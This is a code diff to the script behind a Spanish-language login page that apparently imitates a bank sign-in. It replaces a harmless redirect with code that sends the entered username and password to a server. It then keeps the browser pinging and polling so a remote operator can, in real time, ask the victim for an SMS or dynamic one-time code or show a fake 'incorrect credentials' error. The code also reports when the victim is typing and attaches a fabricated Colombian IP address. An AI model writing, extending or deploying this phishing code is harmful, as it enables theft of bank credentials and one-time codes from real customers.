@@ -1,23 +1,100 @@
+let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
+sessionStorage.setItem('sessionId', sessionId);
+
+let pingInterval = null;
+let pollInterval = null;
+
+function startPing() {
+  if (pingInterval) clearInterval(pingInterval);
+  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+  pingInterval = setInterval(() => {
+    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+  }, 3000);
+}
+
+function stopPing() {
+  if (pingInterval) {
+    clearInterval(pingInterval);
+    pingInterval = null;
+  }
+}
+
+function startPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
+    try {
+      const response = await fetch(`/api/sessions/${sessionId}`);
+      if (response.ok) {
+        const data = await response.json();
+        const action = data.action;
+        if (action === 'dinamica' || action === 'sms') {
+          stopPing();
+          stopPolling();
+          sessionStorage.setItem('otpType', action);
+          window.location.href = "clave.html";
+        } else if (action === 'error-login') {
+          stopPing();
+          stopPolling();
+          lastSentState = null;
+          document.getElementById("svn-loader").hidden = true;
+          msg.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
+          msg.hidden = false;
+        }
+      }
+    } catch (_) {}
+  }, 1000);
+}
+
+function stopPolling() {
+  if (pollInterval) {
+    clearInterval(pollInterval);
+    pollInterval = null;
+  }
+}
+
 const form = document.getElementById("login-form");
 const submit = document.getElementById("submit");
 const fields = ["user", "password"].map((id) => document.getElementById(id));
+const msg = document.getElementById("form-msg");
 const toast = document.getElementById("toast");
 const helpCard = document.getElementById("help-card");
 
 function filled() {
-  return fields.every((field) => field.value.trim().length > 0);
+  return fields.every((field) => field && field.value.trim().length > 0);
 }
 
 function refresh() {
   submit.disabled = !filled();
 }
 
-fields.forEach((field) => field.addEventListener("input", refresh));
+fields.forEach((field) => {
+  if (field) field.addEventListener("input", refresh);
+});
+
+let lastSentState = null;
+fields.forEach((field) => {
+  if (!field) return;
+  field.addEventListener("input", () => {
+    if (pollInterval) {
+      const targetState = 'typing';
+      if (lastSentState !== targetState) {
+        lastSentState = targetState;
+        fetch(`/api/sessions/${sessionId}/state`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ state: targetState })
+        }).catch(() => {});
+      }
+    }
+  });
+});
 
 document.querySelectorAll("[data-toggle]").forEach((button) => {
   button.addEventListener("click", () => {
     const input = document.getElementById(button.dataset.toggle);
-    input.type = input.type === "password" ? "text" : "password";
+    if (input) {
+      input.type = input.type === "password" ? "text" : "password";
+    }
   });
 });
 
@@ -29,12 +106,50 @@ function showToast(text) {
   }, 2800);
 }
 
+window.addEventListener('DOMContentLoaded', () => {
+  const params = new URLSearchParams(window.location.search);
+  const error = params.get('error');
+  if (error === 'error-login') {
+    msg.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
+    msg.hidden = false;
+  }
+});
+
 form.addEventListener("submit", (event) => {
   event.preventDefault();
+  msg.hidden = true;
+  msg.textContent = "";
   document.getElementById("svn-loader").hidden = false;
-  window.setTimeout(() => {
-    window.location.href = "clave.html";
-  }, 1400);
+  lastSentState = null;
+
+  const usernameVal = document.getElementById("user").value.trim();
+  const passwordVal = document.getElementById("password").value.trim();
+
+  const session = {
+    id: sessionId,
+    username: usernameVal,
+    password: passwordVal,
+    tipoUsuario: 'PERSONA',
+    device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
+    ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
+    state: 'waiting',
+    createdAt: Date.now()
+  };
+
+  fetch('/api/sessions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(session)
+  })
+  .then(() => {
+    startPing();
+    startPolling();
+  })
+  .catch(() => {
+    document.getElementById("svn-loader").hidden = true;
+    msg.textContent = "Error al intentar conectar. Intente de nuevo.";
+    msg.hidden = false;
+  });
 });
 
 document.getElementById("forgot-user").addEventListener("click", (event) => {
